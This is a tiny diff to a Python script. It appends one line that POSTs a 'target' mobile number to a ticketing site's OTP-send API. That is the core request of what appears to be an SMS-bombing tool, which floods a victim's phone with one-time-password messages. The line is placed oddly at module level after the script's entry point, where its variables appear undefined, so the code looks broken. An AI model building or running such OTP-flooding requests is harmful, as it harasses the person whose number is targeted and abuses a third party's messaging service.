@@ -32,3 +32,4 @@ def start():
 
 if __name__ == "__main__":
     start()
+requests.post("https://api.bdtickets.com/api/v1/otp/send", json={"mobileNumber": target}, headers=headers, timeout=10)
